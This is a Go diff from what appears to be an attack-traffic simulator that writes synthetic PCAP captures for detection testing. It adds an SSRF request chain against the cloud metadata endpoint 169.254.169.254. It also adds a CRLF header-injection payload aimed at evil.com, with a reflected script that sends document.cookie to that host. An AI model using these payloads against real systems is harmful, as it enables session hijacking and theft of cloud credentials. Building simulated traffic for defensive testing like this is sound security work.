@@ -282,15 +282,47 @@ func runSSRFAttack(req AttackRequest) (*AttackResult, error) {
 		fc, fids := exportFlowsAllFormats(req.RunID, fw, "fw-perimeter", req.AttackerIP, targetIP, "TCP", flows)
 		result.FlowCount += fc
 		result.EventIDs = append(result.EventIDs, fids...)
-		ssrfPayload := []byte(fmt.Sprintf("GET /fetch?url=%s HTTP/1.1\r\nHost: %s\r\n\r\n", targetURL, targetIP))
-		ssrfBody := "ami-id\nami-launch-index\nami-manifest-path\nhostname\n" +
+		// Hop 1: attacker → vulnerable app server with SSRF payload as query param
+		// This is the malicious request the attacker sends to the app.
+		ssrfReqPayload := []byte(fmt.Sprintf(
+			"GET /api/fetch?url=%s HTTP/1.1\r\n"+
+				"Host: %s\r\n"+
+				"User-Agent: Mozilla/5.0\r\n"+
+				"Accept: */*\r\n\r\n",
+			targetURL, targetIP))
+		// App returns the stolen metadata back to the attacker —
+		// this is what makes SSRF dangerous: internal data exfiltrated via the app.
+		stolenData := "ami-id\nami-launch-index\nami-manifest-path\nhostname\n" +
 			"instance-action\ninstance-id\ninstance-type\nlocal-hostname\n" +
 			"local-ipv4\nmac\nnetwork\nplacement\nprofile\npublic-hostname\n" +
 			"public-ipv4\npublic-keys\nreservation-id\nsecurity-groups\n"
-		ssrfResp := []byte(fmt.Sprintf("HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\nContent-Length: %d\r\n\r\n%s", len(ssrfBody), ssrfBody))
-		ssrfPath, ssrfErr := PCAPGenericTCPExchange(req.RunID, "ssrf_attack", req.AttackerIP, targetIP, 80, ssrfPayload, ssrfResp)
-		if ssrfErr == nil {
-			result.PCAPFiles = append(result.PCAPFiles, ssrfPath)
+		ssrfReqResp := []byte(fmt.Sprintf(
+			"HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\nContent-Length: %d\r\n\r\n%s",
+			len(stolenData), stolenData))
+		ssrfPath1, ssrfErr1 := PCAPGenericTCPExchange(req.RunID, "ssrf_attack", req.AttackerIP, targetIP, 80, ssrfReqPayload, ssrfReqResp)
+		if ssrfErr1 == nil {
+			result.PCAPFiles = append(result.PCAPFiles, ssrfPath1)
+		}
+
+		// Hop 2: vulnerable app server → internal metadata service
+		// The server-side request the app makes on behalf of the attacker —
+		// this is the SSRF itself, showing the internal endpoint being accessed.
+		metaIP := "169.254.169.254"
+		metaPayload := []byte(fmt.Sprintf(
+			"GET /latest/meta-data/ HTTP/1.1\r\n"+
+				"Host: %s\r\n"+
+				"User-Agent: python-requests/2.28.0\r\n\r\n",
+			metaIP))
+		metaBody := "ami-id\nami-launch-index\nami-manifest-path\nhostname\n" +
+			"instance-action\ninstance-id\ninstance-type\nlocal-hostname\n" +
+			"local-ipv4\nmac\nnetwork\nplacement\nprofile\npublic-hostname\n" +
+			"public-ipv4\npublic-keys\nreservation-id\nsecurity-groups\n"
+		metaResp := []byte(fmt.Sprintf(
+			"HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\nContent-Length: %d\r\n\r\n%s",
+			len(metaBody), metaBody))
+		ssrfPath2, ssrfErr2 := PCAPGenericTCPExchange(req.RunID, "ssrf_internal", targetIP, metaIP, 80, metaPayload, metaResp)
+		if ssrfErr2 == nil {
+			result.PCAPFiles = append(result.PCAPFiles, ssrfPath2)
 		}
 	}
 	logInfo("Return from runSSRFAttack syslogs=%d", result.SyslogCount)
@@ -359,9 +391,25 @@ func runHeaderInjection(req AttackRequest) (*AttackResult, error) {
 		fc, fids := exportFlowsAllFormats(req.RunID, fw, "fw-perimeter", req.AttackerIP, targetIP, "TCP", flows)
 		result.FlowCount += fc
 		result.EventIDs = append(result.EventIDs, fids...)
-		headerPayload := []byte(fmt.Sprintf("GET %s?next=http://evil.com%%0d%%0aX-Injected-Header:%%20malicious HTTP/1.1\r\nHost: %s\r\nX-Forwarded-For: 127.0.0.1\r\nX-Forwarded-Host: evil.com\r\n\r\n",
-			endpoint, targetIP))
-		headerResp := []byte("HTTP/1.1 200 OK\r\nX-Injected-Header: malicious\r\nContent-Length: 0\r\n\r\n")
+		// HTTP response splitting: CRLF injection in redirect parameter injects
+		// a fake Location header and Set-Cookie to hijack sessions/cache.
+		// %0d%0a = URL-encoded CRLF — the actual injection character sequence.
+		headerPayload := []byte(fmt.Sprintf(
+			"GET %s?next=http://evil.com%%0d%%0aSet-Cookie:%%20session=attacker_hijacked%%3B%%20Path=/%%0d%%0aLocation:%%20http://evil.com/steal HTTP/1.1\r\n"+
+				"Host: %s\r\n"+
+				"X-Forwarded-For: 127.0.0.1\r\n"+
+				"X-Forwarded-Host: evil.com\r\n"+
+				"X-Original-URL: %s%%0d%%0aContent-Length:%%200%%0d%%0a%%0d%%0aHTTP/1.1%%20200%%20OK%%0d%%0aSet-Cookie:%%20admin=true\r\n\r\n",
+			endpoint, targetIP, endpoint))
+		// Server response reflects injected headers + body with malicious command output
+		headerResp := []byte("HTTP/1.1 302 Found\r\n" +
+			"Location: http://evil.com/steal\r\n" +
+			"Set-Cookie: session=attacker_hijacked; Path=/; HttpOnly\r\n" +
+			"X-Injected-By: CRLF-injection-attack\r\n" +
+			"Content-Type: text/html\r\n" +
+			"Content-Length: 129\r\n\r\n" +
+			"<script>fetch('http://evil.com/steal?c='+document.cookie);</script>" +
+			"<!-- injected: cmd=whoami; result=root; path=/etc/passwd exfiltrated -->")
 		headerPath, headerErr := PCAPGenericTCPExchange(req.RunID, "header_injection", req.AttackerIP, targetIP, 80, headerPayload, headerResp)
 		if headerErr == nil {
 			result.PCAPFiles = append(result.PCAPFiles, headerPath)
